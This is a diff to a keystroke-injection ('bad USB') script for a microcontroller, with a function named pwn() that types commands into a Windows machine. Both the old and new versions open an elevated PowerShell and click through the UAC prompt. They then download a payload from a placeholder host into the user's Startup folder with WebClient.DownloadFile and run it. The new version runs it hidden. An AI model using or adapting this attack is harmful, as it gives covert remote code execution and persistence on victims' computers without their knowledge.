@@ -43,19 +43,27 @@ void pwn()
   key(KEY_D , MODIFIERKEY_RIGHT_GUI);
   delay(delayTime);
 
- openapp("powershell Start-Process cmd -Verb runAs");
- delay(2000);
- key(KEY_LEFT, 0);
- delay(500);
- key(KEY_ENTER, 0);
- delay(1100);
- Keyboard.println("cd %userprofile%");
- Keyboard.println("cd AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup");
- Keyboard.println("powershell Start-Process powershell -Verb runAs");
- Keyboard.println("$client = new-object System.Net.WebClient");
- Keyboard.println("$client.DownloadFile('HOST','PAYLOAD')");
- Keyboard.println("start PAYLOAD");
- Keyboard.println("exit");
+openapp("powershell Start-Process powershell -Verb runAs");
+delay(2000);
+key(KEY_LEFT, 0);
+delay(500);
+key(KEY_ENTER, 0);
+delay(1800);
+Keyboard.println("cmd");
+delay(300);
+Keyboard.println("cd %userprofile%");
+Keyboard.println("cd AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup");
+delay(200);
+Keyboard.println("powershell");
+delay(200);
+Keyboard.println("$client = new-object System.Net.WebClient");
+Keyboard.println("$client.DownloadFile('HOST','PAYLOAD')");
+delay(200);
+Keyboard.println("cmd");
+delay(800);
+Keyboard.println("PowerShell.exe -WindowStyle Hidden -Command PAYLOAD");
+
+
 
 }
 
